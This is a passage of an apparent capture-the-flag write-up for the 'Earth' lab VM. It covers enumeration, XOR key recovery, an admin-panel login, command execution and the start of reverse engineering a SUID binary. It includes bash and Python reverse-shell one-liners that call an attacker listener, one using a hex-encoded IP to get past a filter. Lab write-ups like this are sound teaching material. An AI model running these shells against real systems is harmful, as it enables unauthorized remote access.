+|       TLS_AKE_WITH_AES_128_CCM_SHA256 (ecdh_x25519) - A
+|       TLS_AKE_WITH_AES_128_GCM_SHA256 (ecdh_x25519) - A
+|       TLS_AKE_WITH_AES_256_GCM_SHA384 (ecdh_x25519) - A
+|       TLS_AKE_WITH_CHACHA20_POLY1305_SHA256 (ecdh_x25519) - A
+|     cipher preference: client
+|_  least strength: A
+MAC Address: 08:00:27:9E:47:87 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 5.X
+OS CPE: cpe:/o:linux:linux_kernel:5.4
+OS details: Linux 5.4
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.69 ms 192.168.56.67
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.49 seconds
+</code></pre>
+<p>Wait, the output is a little different, I used earth.local; I think I should use $RHOST (ip) again.</p>
+<pre class="shell"><code>sudo nmap -n $RHOST -T4 --min-rate=5000 -A -sVC -p22,80,443 -Pn --script=vuln,*enum* | tee nmap.vuln-enum.IP.txt</code></pre>
+<p>This didn’t help. At all.</p>
+<pre class="shell"><code>sudo nmap -n $RHOST -T4 --min-rate=5000 -sVC -p22,80,443 -Pn                                                  
+Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-06 09:56 IST
+Nmap scan report for 192.168.56.67
+Host is up (0.00034s latency).
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
+| ssh-hostkey: 
+|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
+|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Bad Request (400)
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
+|_http-title: Bad Request (400)
+| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
+| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
+| Not valid before: 2021-10-12T23:26:31
+|_Not valid after:  2031-10-10T23:26:31
+|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+MAC Address: 08:00:27:9E:47:87 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.48 seconds</code></pre>
+<figure>
+    <img src="41.wait-was-I-blind.png" alt="" /><figcaption>41.wait-was-I-blind</figcaption>
+</figure>
+<p>Like an idiot, I didn’t read <code>terratest.earth.local</code> earlier. I only glanced and found <code>earth.local</code>. That was bad. It was on me.</p>
+<figure>
+    <img src="42.updating-etc-hosts-again-sigh.png" alt="" /><figcaption>42.updating-etc-hosts-again-sigh</figcaption>
+</figure>
+<figure>
+    <img src="43.curl-again.png" alt="" /><figcaption>43.curl-again</figcaption>
+</figure>
+<figure>
+    <img src="44.nikto-again.png" alt="" /><figcaption>44.nikto-again</figcaption>
+</figure>
+<pre class="shell"><code>gobuster dir --url http://terratest.earth.local --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x txt -q
+/.                    (Status: 200) [Size: 16343]
+/poweredby.png        (Status: 200) [Size: 5714]</code></pre>
+<figure>
+    <img src="45.gobuster-again.png" alt="" /><figcaption>45.gobuster-again</figcaption>
+</figure>
+<p>Well, this sucks, because raft file already contains file extensions.</p>
+<p>Nothing changed without <code>-x txt</code>.</p>
+<blockquote>
+    <p>Trying gobuster on https</p>
+</blockquote>
+<pre class="shell"><code>gobuster dir --url https://terratest.earth.local --wordlist /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -q -k -b &quot;403,404&quot;
+/index.html           (Status: 200) [Size: 26]
+/robots.txt           (Status: 200) [Size: 521]
+/.                    (Status: 200) [Size: 26] 
+/poweredby.png        (Status: 200) [Size: 5714]</code></pre>
+<figure>
+    <img src="46.there-is-a-robots-txt-after-all.png" alt="" /><figcaption>46.there-is-a-robots-txt-after-all</figcaption>
+</figure>
+<pre class="shell"><code>curl -k -s https://terratest.earth.local/robots.txt     
+User-Agent: *
+Disallow: /*.asp
+Disallow: /*.aspx
+Disallow: /*.bat
+Disallow: /*.c
+Disallow: /*.cfm
+Disallow: /*.cgi
+Disallow: /*.com
+Disallow: /*.dll
+Disallow: /*.exe
+Disallow: /*.htm
+Disallow: /*.html
+Disallow: /*.inc
+Disallow: /*.jhtml
+Disallow: /*.jsa
+Disallow: /*.json
+Disallow: /*.jsp
+Disallow: /*.log
+Disallow: /*.mdb
+Disallow: /*.nsf
+Disallow: /*.php
+Disallow: /*.phtml
+Disallow: /*.pl
+Disallow: /*.reg
+Disallow: /*.sh
+Disallow: /*.shtml
+Disallow: /*.sql
+Disallow: /*.txt
+Disallow: /*.xml
+Disallow: /testingnotes.*
+
+
+curl -k -s https://terratest.earth.local/          
+Test site, please ignore.
+</code></pre>
+<figure>
+    <img src="47.robots-will-be-the-downfall-of-Earth.png" alt="" /><figcaption>47.robots-will-be-the-downfall-of-Earth</figcaption>
+</figure>
+<pre class="shell"><code>curl -k -s https://terratest.earth.local/testingnotes.txt
+Testing secure messaging system notes:
+*Using XOR encryption as the algorithm, should be safe as used in RSA.
+*Earth has confirmed they have received our sent messages.
+*testdata.txt was used to test encryption.
+*terra used as username for admin portal.
+Todo:
+*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
+*Need to test different key lengths to protect against bruteforce. How long should the key be?
+*Need to improve the interface of the messaging interface and the admin panel, it&#39;s currently very basic.</code></pre>
+<figure>
+    <img src="48.testingnotes-txt.png" alt="" /><figcaption>48.testingnotes-txt</figcaption>
+</figure>
+<pre class="shell"><code>curl -k -s https://terratest.earth.local/testdata.txt    
+According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</code></pre>
+<figure>
+    <img src="49.testdata.png" alt="" /><figcaption>49.testdata</figcaption>
+</figure>
+<div class="sourceCode" id="cb37"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb37-1"><a href="#cb37-1" aria-hidden="true"></a><span class="kw">var</span> plainText <span class="op">=</span> <span class="st">&quot;According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#39;s history, life appeared in the oceans and began to affect Earth&#39;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.&quot;</span></span>
+<span id="cb37-2"><a href="#cb37-2" aria-hidden="true"></a><span class="kw">var</span> plainValues <span class="op">=</span> plainText<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span>
+<span id="cb37-3"><a href="#cb37-3" aria-hidden="true"></a></span>
+<span id="cb37-4"><a href="#cb37-4" aria-hidden="true"></a><span class="kw">var</span> cipherText <span class="op">=</span> <span class="st">&quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&quot;</span></span>
+<span id="cb37-5"><a href="#cb37-5" aria-hidden="true"></a><span class="kw">var</span> cipherValues <span class="op">=</span> cipherText<span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(i<span class="op">,</span> <span class="dv">16</span>))</span>
+<span id="cb37-6"><a href="#cb37-6" aria-hidden="true"></a></span>
+<span id="cb37-7"><a href="#cb37-7" aria-hidden="true"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(plainValues<span class="op">.</span><span class="at">length</span><span class="op">,</span> cipherValues<span class="op">.</span><span class="at">length</span>)</span>
+<span id="cb37-8"><a href="#cb37-8" aria-hidden="true"></a></span>
+<span id="cb37-9"><a href="#cb37-9" aria-hidden="true"></a><span class="kw">var</span> keyValues <span class="op">=</span> cipherValues<span class="op">.</span><span class="fu">map</span>((v<span class="op">,</span> i) <span class="kw">=&gt;</span> v <span class="op">^</span> plainValues[i])</span>
+<span id="cb37-10"><a href="#cb37-10" aria-hidden="true"></a><span class="kw">var</span> keyText <span class="op">=</span> keyValues<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(i))<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb37-11"><a href="#cb37-11" aria-hidden="true"></a></span>
+<span id="cb37-12"><a href="#cb37-12" aria-hidden="true"></a>keyText</span>
+<span id="cb37-13"><a href="#cb37-13" aria-hidden="true"></a><span class="st">&quot;earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat&quot;</span></span></code></pre></div>
+<figure>
+    <img src="50.finally-a-key.png" alt="" /><figcaption>50.finally-a-key</figcaption>
+</figure>
+<p>Looks like <code>earthclimatechangebad4humans</code> is getting repeated.</p>
+<p>Possible user names:</p>
+<ul>
+    <li>terra</li>
+    <li>Terra</li>
+</ul>
+<p>Possible passwords:</p>
+<ul>
+    <li>earthclimatechangebad4humans</li>
+    <li>EarthClimateChangeBad4Humans</li>
+    <li>earthclimatechangebadforhumans</li>
+    <li>EarthClimateChangeBadForHumans</li>
+</ul>
+<p><code>hydra</code> failed for http-post-form and for ssh with the given info.</p>
+<p>There is one more cipher text left. What is that?</p>
+<div class="sourceCode" id="cb38"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb38-1"><a href="#cb38-1" aria-hidden="true"></a><span class="kw">var</span> cipherText <span class="op">=</span> <span class="st">&quot;37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40&quot;</span></span>
+<span id="cb38-2"><a href="#cb38-2" aria-hidden="true"></a><span class="kw">var</span> cipherHexes <span class="op">=</span> cipherText<span class="op">.</span><span class="fu">match</span>(<span class="ss">/</span><span class="sc">(</span><span class="ss">..</span><span class="sc">?)</span><span class="ss">/g</span>)</span>
+<span id="cb38-3"><a href="#cb38-3" aria-hidden="true"></a></span>
+<span id="cb38-4"><a href="#cb38-4" aria-hidden="true"></a><span class="kw">var</span> key <span class="op">=</span> <span class="st">&quot;earthclimatechangebad4humans&quot;</span><span class="op">.</span><span class="fu">repeat</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(cipherText<span class="op">.</span><span class="at">length</span> <span class="op">/</span> <span class="dv">2</span> <span class="op">/</span> <span class="dv">28</span>))</span>
+<span id="cb38-5"><a href="#cb38-5" aria-hidden="true"></a><span class="kw">var</span> keyDecimals <span class="op">=</span> key<span class="op">.</span><span class="fu">split</span>(<span class="st">&#39;&#39;</span>)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> i<span class="op">.</span><span class="fu">charCodeAt</span>(<span class="dv">0</span>))</span>
+<span id="cb38-6"><a href="#cb38-6" aria-hidden="true"></a></span>
+<span id="cb38-7"><a href="#cb38-7" aria-hidden="true"></a><span class="kw">var</span> cipherDecimals <span class="op">=</span> cipherHexes<span class="op">.</span><span class="fu">map</span>(h <span class="kw">=&gt;</span> <span class="pp">parseInt</span>(h<span class="op">,</span> <span class="dv">16</span>))</span>
+<span id="cb38-8"><a href="#cb38-8" aria-hidden="true"></a>keyDecimals<span class="op">.</span><span class="fu">map</span>((k<span class="op">,</span> i) <span class="kw">=&gt;</span> cipherDecimals[i] <span class="op">^</span> k)<span class="op">.</span><span class="fu">map</span>(i <span class="kw">=&gt;</span> <span class="bu">String</span><span class="op">.</span><span class="fu">fromCharCode</span>(i))<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)</span>
+<span id="cb38-9"><a href="#cb38-9" aria-hidden="true"></a></span>
+<span id="cb38-10"><a href="#cb38-10" aria-hidden="true"></a><span class="st">&quot;Rhy-kl}ofko+change!ss&gt;s~c id*{yp&amp;ilkor:ouuvjd&lt;d|&#39;</span><span class="sc">\u0003</span><span class="st">g`nj~2+U|hblgbk|7kc1Cavw</span><span class="sc">\&quot;</span><span class="st">8B.</span><span class="sc">\u008a</span><span class="st">ô×s ge}t5rrbi.46,&lt;6</span><span class="sc">\&quot;</span><span class="st">d`pbbb!c~q/%!&#39;(-*+ok|g|&gt;$a~`g$</span><span class="sc">\u0087</span><span class="st">ãÔ*(it{gh*~`1frhfsmh:z~io/J}afa:tbkn-fd8S</span><span class="sc">\u007f</span><span class="st">|</span><span class="sc">\&quot;</span><span class="st">[</span><span class="sc">\u007f</span><span class="st">pd9$De.iw$bqe?+`judn&amp;ao-kbao#yuo o`bz+uig(t;os noja5gi#Bornt</span><span class="sc">\u0081</span><span class="st">é×s$C~ye&gt;+Wbvxrh!rthclimatechangebad4humans&quot;</span></span></code></pre></div>
+<figure>
+    <img src="51.wait-is-that-the-key-in-the-message.png" alt="" /><figcaption>51.wait-is-that-the-key-in-the-message</figcaption>
+</figure>
+<p>Nope. This was a false flag, due to wrong code.</p>
+<div class="sourceCode" id="cb39"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb39-1"><a href="#cb39-1" aria-hidden="true"></a><span class="kw">var</span> key <span class="op">=</span> <span class="st">&quot;earthclimatechangebad4humans&quot;</span><span class="op">.</span><span class="fu">repeat</span>(<span class="bu">Math</span><span class="op">.</span><span class="fu">ceil</span>(cipherText<span class="op">.</span><span class="at">length</span> <span class="op">/</span> <span class="dv">2</span> ))<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span><span class="op">,</span> cipherHexes<span class="op">.</span><span class="at">length</span>)</span>
+<span id="cb39-2"><a href="#cb39-2" aria-hidden="true"></a><span class="co">//...</span></span>
+<span id="cb39-3"><a href="#cb39-3" aria-hidden="true"></a><span class="st">&quot;Rhy-kl}ofko+change!ss&gt;s~c id*{yp&amp;ilkor:ouuvjd&lt;d|&#39;</span><span class="sc">\u0003</span><span class="st">g`nj~2+U|hblgbk|7kc1Cavw</span><span class="sc">\&quot;</span><span class="st">8B.</span><span class="sc">\u008a</span><span class="st">ô×s ge}t5rrbi.46,&lt;6</span><span class="sc">\&quot;</span><span class="st">d`pbbb!c~q/%!&#39;(-*+ok|g|&gt;$a~`g$</span><span class="sc">\u0087</span><span class="st">ãÔ*(it{gh*~`1frhfsmh:z~io/J}afa:tbkn-fd8S</span><span class="sc">\u007f</span><span class="st">|</span><span class="sc">\&quot;</span><span class="st">[</span><span class="sc">\u007f</span><span class="st">pd9$De.iw$bqe?+`judn&amp;ao-kbao#yuo o`bz+uig(t;os noja5gi#Bornt</span><span class="sc">\u0081</span><span class="st">é×s$C~ye&gt;+Wbvxrh!&quot;</span></span></code></pre></div>
+<p>Maximum Key length is 50.</p>
+<blockquote>
+    <p>Lets try manual login on the webpage: http://terratest.earth.local/admin/login</p>
+</blockquote>
+<p>Credentials terra:earthclimatechangebad4humans</p>
+<p>It worked!</p>
+<figure>
+    <img src="52.logged-in.png" alt="" /><figcaption>52.logged-in</figcaption>
+</figure>
+<h2 id="webshell">WebShell</h2>
+<p>I am calling it a webshell, even though I have not uploaded it, it is a shell and in web.</p>
+<p><code>whoami &amp;&amp; id &amp;&amp; hostname</code>: <code>apache uid=48(apache) gid=48(apache) groups=48(apache) earth</code></p>
+<figure>
+    <img src="53.working-webshell.png" alt="" /><figcaption>53.working-webshell</figcaption>
+</figure>
+<blockquote>
+    <p>cat /etc/passwd</p>
+</blockquote>
+<pre class="shell"><code>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin
+systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:996:994:User for polkitd:/:/sbin/nologin
+rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin
+cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin
+tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin
+abrt:x:173:173::/etc/abrt:/sbin/nologin
+setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin
+rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin
+dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin
+chrony:x:991:987::/var/lib/chrony:/sbin/nologin
+tcpdump:x:72:72::/:/sbin/nologin
+systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin
+unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin
+earth:x:1000:1000::/home/earth:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</code></pre>
+<figure>
+    <img src="54.cat-etc-passwd.png" alt="" /><figcaption>54.cat-etc-passwd</figcaption>
+</figure>
+<blockquote>
+    <p><code>ls -lahR /home/</code></p>
+</blockquote>
+<pre class="shell"><code>Command output: /home/:
+total 0
+drwxr-xr-x.  3 root  root   19 Oct 11 15:10 .
+dr-xr-xr-x. 17 root  root  244 Nov  1 16:38 ..
+drwx------.  4 earth earth 141 Oct 13 00:23 earth</code></pre>
+<blockquote>
+    <p><code>find / -perm -4000 2&gt;/dev/null</code></p>
+</blockquote>
+<pre><code>/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/reset_root
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/mount.nfs
+/usr/lib/polkit-1/polkit-agent-helper-</code></pre>
+<p><code>reset_root</code> seems weird. But what is it?</p>
+<blockquote>
+    <p><code>bash -i &gt;&amp; /dev/tcp/192.168.56.40/443 0&gt;&amp;1</code></p>
+</blockquote>
+<p>Says, Remote connections are forbidden.</p>
+<blockquote>
+    <p>Trying with python</p>
+</blockquote>
+<pre class="shell"><code>python -c &#39;socket=__import__(&quot;socket&quot;);os=__import__(&quot;os&quot;);pty=__import__(&quot;pty&quot;);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.40&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre>
+<p>This doesn’t work as the length of acceptable command is shorter.</p>
+<blockquote>
+    <p><code>env</code></p>
+</blockquote>
+<pre><code>PWD=/
+SYSTEMD_EXEC_PID=837
+TZ=UTC
+HOME=/usr/share/httpd
+LANG=C
+INVOCATION_ID=e8b30f16b1744a3ea9c9ca9d5c674fdc
+DJANGO_SETTINGS_MODULE=earth_web.settings
+NOTIFY_SOCKET=/run/systemd/notify
+SHLVL=0
+JOURNAL_STREAM=8:23114
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
+_=/usr/bin/env</code></pre>
+<h3 id="user-flag">user flag</h3>
+<pre class="shell"><code>ls /var/earth_web
+db.sqlite3 earth_web manage.py secure_message user_flag.txt
+
+
+cat /var/earth_web/user_flag.txt 
+[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]</code></pre>
+<figure>
+    <img src="55.user-flag.png" alt="" /><figcaption>55.user-flag</figcaption>
+</figure>
+<blockquote>
+    <p><code>ls -lAhR /var/</code></p>
+</blockquote>
+<p>Nothing useful.</p>
+<blockquote>
+    <p>Using hexadecimal IP address.</p>
+</blockquote>
+<p>No seriously, what else is left to test and try?</p>
+<p>c0.a8.38.28 is 192.168.56.40 0xc0.0xa8.0x38.0x28 is valid IP address.</p>
+<blockquote>
+    <p>Caught a shell</p>
+</blockquote>
+<p>command: <code>bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x38.0x28/443 0&gt;&amp;1</code></p>
+<pre class="shell"><code>sudo nc -nlvp $LPORT -s $LHOST
+[sudo] password for f0c1s: 
+Listening on 192.168.56.40 443
+Connection received on 192.168.56.67 35462
+bash: cannot set terminal process group (837): Inappropriate ioctl for device
+bash: no job control in this shell
+bash-5.1$ 
+</code></pre>
+<figure>
+    <img src="56.reverse-shell.png" alt="" /><figcaption>56.reverse-shell</figcaption>
+</figure>
+<h2 id="reverse-shell">Reverse shell</h2>
+<p>Even though I have caught it, I don’t think I can do much here. It is almost the same as the existing one. But sure, lets keep going.</p>
+<figure>
+    <img src="57.even-lse-points-to-reset-root.png" alt="" /><figcaption>57.even-lse-points-to-reset-root</figcaption>
+</figure>
+<figure>
+    <img src="58.trying-to-understand-reset_root.png" alt="" /><figcaption>58.trying-to-understand-reset_root</figcaption>
+</figure>
+<p>There is a mention of root and <code>theEarthisflat</code> and <code>root:Earth</code>. Nothing worked so far.</p>
+<blockquote>
+    <p>cannot find <code>strace</code> or <code>ltrace</code></p>
+</blockquote>
+<p>This can be ok. But this seems intentional.</p>
+<p>Things I tried:</p>
+<ul>
+    <li>objdump</li>
+    <li>strings</li>
+    <li>readelf</li>
+    <li>gdb</li>
+    <li>ldd</li>
+    <li>file</li>
+    <li>hexdump</li>
+</ul>
+<p>Gotta smuggle this out of here…</p>
+<h2 id="reverse-engineering">Reverse Engineering</h2>
+<div class="sourceCode" id="cb47"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb47-1"><a href="#cb47-1" aria-hidden="true"></a></span>
+<span id="cb47-2"><a href="#cb47-2" aria-hidden="true"></a>undefined8 main(<span class="dt">void</span>)</span>
+<span id="cb47-3"><a href="#cb47-3" aria-hidden="true"></a></span>
+<span id="cb47-4"><a href="#cb47-4" aria-hidden="true"></a>{</span>
+<span id="cb47-5"><a href="#cb47-5" aria-hidden="true"></a>  <span class="dt">int</span> iVar1;</span>
+<span id="cb47-6"><a href="#cb47-6" aria-hidden="true"></a>  undefined8 local_10c5;</span>
+<span id="cb47-7"><a href="#cb47-7" aria-hidden="true"></a>  undefined4 local_10bd;</span>
+<span id="cb47-8"><a href="#cb47-8" aria-hidden="true"></a>  undefined local_10b9;</span>
+<span id="cb47-9"><a href="#cb47-9" aria-hidden="true"></a>  undefined8 local_10b8;</span>
+<span id="cb47-10"><a href="#cb47-10" aria-hidden="true"></a>  undefined8 local_10b0;</span>
+<span id="cb47-11"><a href="#cb47-11" aria-hidden="true"></a>  undefined local_10a8;</span>
+<span id="cb47-12"><a href="#cb47-12" aria-hidden="true"></a>  undefined8 local_1098;</span>
+<span id="cb47-13"><a href="#cb47-13" aria-hidden="true"></a>  undefined8 local_1090;</span>
+<span id="cb47-14"><a href="#cb47-14" aria-hidden="true"></a>  undefined local_1088;</span>
+<span id="cb47-15"><a href="#cb47-15" aria-hidden="true"></a>  <span class="dt">char</span> local_1078 [<span class="dv">13</span>];</span>
+<span id="cb47-16"><a href="#cb47-16" aria-hidden="true"></a>  undefined local_106b;</span>
+<span id="cb47-17"><a href="#cb47-17" aria-hidden="true"></a>  undefined local_1067;</span>
+<span id="cb47-18"><a href="#cb47-18" aria-hidden="true"></a>  undefined8 local_78;</span>
+<span id="cb47-19"><a href="#cb47-19" aria-hidden="true"></a>  undefined8 local_70;</span>
+<span id="cb47-20"><a href="#cb47-20" aria-hidden="true"></a>  undefined8 local_68;</span>
+<span id="cb47-21"><a href="#cb47-21" aria-hidden="true"></a>  undefined8 local_60;</span>
+<span id="cb47-22"><a href="#cb47-22" aria-hidden="true"></a>  undefined local_58 [<span class="dv">17</span>];</span>
+<span id="cb47-23"><a href="#cb47-23" aria-hidden="true"></a>  undefined local_47;</span>
+<span id="cb47-24"><a href="#cb47-24" aria-hidden="true"></a>  undefined8 local_38;</span>
+<span id="cb47-25"><a href="#cb47-25" aria-hidden="true"></a>  undefined8 local_30;</span>
+<span id="cb47-26"><a href="#cb47-26" aria-hidden="true"></a>  undefined local_28;</span>
+<span id="cb47-27"><a href="#cb47-27" aria-hidden="true"></a>  undefined8 local_18;</span>
+<span id="cb47-28"><a href="#cb47-28" aria-hidden="true"></a>  undefined4 local_10;</span>
+<span id="cb47-29"><a href="#cb47-29" aria-hidden="true"></a>  <span class="dt">int</span> local_c;</span>
+<span id="cb47-30"><a href="#cb47-30" aria-hidden="true"></a>  </span>
+<span id="cb47-31"><a href="#cb47-31" aria-hidden="true"></a>  local_18 = <span class="bn">0x65756c62656c6170</span>;</span>
+<span id="cb47-32"><a href="#cb47-32" aria-hidden="true"></a>  local_10 = <span class="bn">0x746f64</span>;</span>
+<span id="cb47-33"><a href="#cb47-33" aria-hidden="true"></a>  local_38 = <span class="bn">0x810190e07090904</span>;</span>
+<span id="cb47-34"><a href="#cb47-34" aria-hidden="true"></a>  local_30 = <span class="bn">0x555c5d041c161d05</span>;</span>
+<span id="cb47-35"><a href="#cb47-35" aria-hidden="true"></a>  local_28 = <span class="bn">0x5e</span>;</span>
+<span id="cb47-36"><a href="#cb47-36" aria-hidden="true"></a>  local_78 = <span class="bn">0x69746e6564657263</span>;</span>
+<span id="cb47-37"><a href="#cb47-37" aria-hidden="true"></a>  local_70 = <span class="bn">0x746f6f7220736c61</span>;</span>
+<span id="cb47-38"><a href="#cb47-38" aria-hidden="true"></a>  local_68 = <span class="bn">0x747261456568743a</span>;</span>
+<span id="cb47-39"><a href="#cb47-39" aria-hidden="true"></a>  local_60 = <span class="bn">0x74616c66736968</span>;</span>
+<span id="cb47-40"><a href="#cb47-40" aria-hidden="true"></a>  local_c = <span class="dv">0</span>;</span>
+<span id="cb47-41"><a href="#cb47-41" aria-hidden="true"></a>  local_1098 = <span class="bn">0xd064314000c5b</span>;</span>
+<span id="cb47-42"><a href="#cb47-42" aria-hidden="true"></a>  local_1090 = <span class="bn">0x27077310b2a194e</span>;</span>
+<span id="cb47-43"><a href="#cb47-43" aria-hidden="true"></a>  local_1088 = <span class="bn">0x75</span>;</span>
+<span id="cb47-44"><a href="#cb47-44" aria-hidden="true"></a>  local_10b8 = <span class="bn">0xd064314000c5b</span>;</span>
+<span id="cb47-45"><a href="#cb47-45" aria-hidden="true"></a>  local_10b0 = <span class="bn">0x620067075b15284e</span>;</span>
+<span id="cb47-46"><a href="#cb47-46" aria-hidden="true"></a>  local_10a8 = <span class="dv">7</span>;</span>
